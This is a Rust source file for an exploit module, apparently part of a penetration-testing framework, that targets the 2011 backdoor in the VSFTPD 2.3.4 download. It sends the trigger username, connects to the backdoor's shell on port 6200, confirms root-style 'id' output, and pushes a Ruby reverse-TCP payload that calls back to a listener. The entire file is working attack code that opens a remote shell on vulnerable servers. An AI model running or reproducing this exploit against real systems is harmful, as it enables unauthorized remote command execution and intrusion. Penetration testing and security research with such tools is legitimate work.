use crate::{
    core::{
        exploit::{remote_tcp::RemoteTcp, Exploit, Info, Kind, Ranking},
        payload::{reverse::Reverse, Payload},
    },
    module::payload::ruby_reverse_tcp::RubyReverseTcp,
    util::gen::random_alphanumeric,
};
use log::info;
use std::{
    error::Error,
    io::{Read, Write},
    net::TcpStream,
    time::Duration,
};

pub struct Vsftpd234Backdoor {
    pub remote_tcp: RemoteTcp,
    pub backdoor_port: Option<String>,
}

impl Vsftpd234Backdoor {
    // TODO: When exploit is being used by CLI interaction, can get RHOST and RPORT there and pass it in
    pub fn new(remote_tcp: RemoteTcp, backdoor_port: Option<String>) -> Vsftpd234Backdoor {
        Vsftpd234Backdoor {
            remote_tcp,
            backdoor_port,
        }
    }

    fn handle_backdoor(&self, mut stream: TcpStream) -> Result<(), Box<dyn Error>> {
        stream.write("id\n".as_bytes())?;

        let mut backdoor_resp = String::new();
        stream.read_to_string(&mut backdoor_resp)?;

        if !backdoor_resp.contains("uid=") {
            return Err("The backdoor port seems to not be a shell".into());
        }
        info!(
            "Received successful backdoor UID response: {}",
            backdoor_resp.trim()
        );

        info!("Starting generic revshell on port 9090");
        let reverse = Reverse {
            lhost: "127.0.0.1".to_string(),
            lport: "9090".to_string(),
        };
        let payload = RubyReverseTcp { reverse };
        payload.pretask()?;
        stream.write(format!("nohup {} >/dev/null 2>&1", payload.blob_as_string()?).as_bytes())?;

        Ok(())
    }
}

impl Exploit for Vsftpd234Backdoor {
    fn default() -> Self {
        Vsftpd234Backdoor {
            remote_tcp: RemoteTcp {
                rhost: "".to_string(),
                rport: "".to_string(),
                read_timeout: Some(Duration::from_secs(60)),
                write_timeout: Some(Duration::from_secs(60)),
            },
            backdoor_port: None,
        }
    }

    fn kind(&self) -> Kind {
        Kind::Remote
    }

    fn ranking(&self) -> Ranking {
        Ranking::Excellent
    }

    fn info(&self) -> Info {
        Info {
            descriptive_name: "VSFTPD v2.3.4 Backdoor Command Execution".to_string(),
            module_path: "exploit/ftp/vsftpd_234_backdoor".to_string(),
            disclosure_date: "2011-07-03".to_string(),
            ranking: self.ranking().to_string(),
            kind: self.kind().to_string(),
            description:
                "This module exploits a malicious backdoor that was added to the VSFTPD download \
        archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between \
        June 30th 2011 and July 1st 2011 according to the most recent information \
        available. This backdoor was removed on July 3rd 2011."
                    .to_string(),
            license: None,
            author: Some(vec!["hdm".to_string(), "MC".to_string()]),
            references: None,
            platform: Some(vec!["unix".to_string()]),
        }
    }

    fn exploit(&self) -> Result<(), Box<dyn std::error::Error>> {
        let backdoor_port = match &self.backdoor_port {
            Some(backdoor_port) => backdoor_port,
            None => "6200",
        };
        info!("Attempting to access backdoor on port {}", backdoor_port);
        match self
            .remote_tcp
            .custom_connect(&self.remote_tcp.rhost, backdoor_port)
        {
            Ok(stream) => {
                info!(
                    "Port {} used by the backdoor bind listener is already open",
                    backdoor_port
                );
                self.handle_backdoor(stream)?;
            }
            Err(e) => info!(
                "Port {} used by backdoor bind listener is not already open: {}",
                backdoor_port, e
            ),
        };

        let mut stream = self.remote_tcp.connect()?;

        let mut banner_resp = String::new();
        stream.read_to_string(&mut banner_resp)?;
        info!("Banner returned from server: {}", banner_resp);

        let user_hash = random_alphanumeric(6);
        stream.write(format!("USER {}:)\r\n", user_hash).as_bytes())?;
        let mut user_hash_resp = String::new();
        stream.read_to_string(&mut user_hash_resp)?;
        info!("Response to user hash: {}", user_hash_resp);

        if user_hash_resp.contains("530") {
            return Err(
                "Server is configured for anonymous only and the backdoor code cannot be reached"
                    .into(),
            );
        }

        if !user_hash_resp.contains("331") {
            return Err(
                "Server is not responding as expected, response should contain 331 code".into(),
            );
        }

        stream.write(format!("PASS {}\r\n", user_hash).as_bytes())?;
        // Server responds here, not necessary to check as backdoor port should now be open

        self.handle_backdoor(stream)?;
        Ok(())
    }
}
